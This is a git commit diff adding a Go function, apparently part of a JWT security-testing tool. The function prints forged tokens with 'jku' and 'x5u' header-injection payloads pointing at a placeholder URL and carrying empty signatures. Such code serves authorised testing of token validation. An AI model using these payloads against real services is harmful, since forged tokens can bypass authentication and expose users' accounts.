750510f948cd3440bccdf91c7cf3cb70d0be55e7
krishpranav <krisna.pranav@gmail.com>
2021-07-15 19:11:30 +0530

    pkg: payload functions g

--- pkg/payload/payload.go
+++ pkg/payload/payload.go
@@ -39,3 +39,24 @@ func GenerateNonePayloads(token string) {
 	}
 
 }
+
+func GenerateUrlPayloads(token string) {
+	tokens := strings.Split(token, ".")
+	claims := tokens[1]
+	var pattern = []string{
+		"jku",
+		"x5u",
+	}
+
+	for k, v := range pattern {
+		_ = k
+		header := "{\"alg\":\"hs256\",\"" + v + "\":\"https://www.google.com\",\"typ\":\"JWT\"}"
+		baseHeader := b64.StdEncoding.EncodeToString([]byte(header))
+		log.WithFields(logrus.Fields{
+			"payload": v,
+			"header":  header,
+		}).Info("Generate " + v + " payload")
+		fmt.Println(baseHeader + "." + claims + ".")
+	}
+
+}
